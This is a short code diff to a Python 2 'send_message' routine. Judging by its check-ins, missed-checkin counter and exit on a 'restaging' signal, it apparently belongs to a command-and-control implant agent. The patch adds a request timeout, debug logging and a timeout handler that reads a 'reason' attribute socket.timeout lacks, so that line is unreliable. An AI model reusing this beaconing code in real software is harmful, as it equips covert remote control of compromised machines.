@@ -854,7 +854,7 @@ def send_message(packets=None):
     requestUri = server + taskURI
 
     try:
-        data = (urllib2.urlopen(urllib2.Request(requestUri, data, headers))).read()
+        data = (urllib2.urlopen(urllib2.Request(requestUri, data, headers), timeout = 5)).read()
         return ('200', data)
 
     except urllib2.HTTPError as HTTPError:
@@ -863,13 +863,21 @@ def send_message(packets=None):
         #if signaled for restaging, exit.
         if HTTPError.code == 401:
             sys.exit(0)
-
+        logging.debug("HTTPError: %s" % HTTPError)
         return (HTTPError.code, '')
 
     except urllib2.URLError as URLerror:
         # if the server cannot be reached
         missedCheckins = missedCheckins + 1
+        logging.debug("URLError: %s" % URLerror)
         return (URLerror.reason, '')
+
+    except socket.timeout as timeout:
+        # Patch to handle timeouts in python 2.7
+        # See: https://stackoverflow.com/questions/2712524/handling-urllib2s-timeout-python
+        missedCheckins += 1
+        logging.debug("Timeout: %s" % timeout)
+        return (timeout.reason, '')
 
     return ('', '')
 """
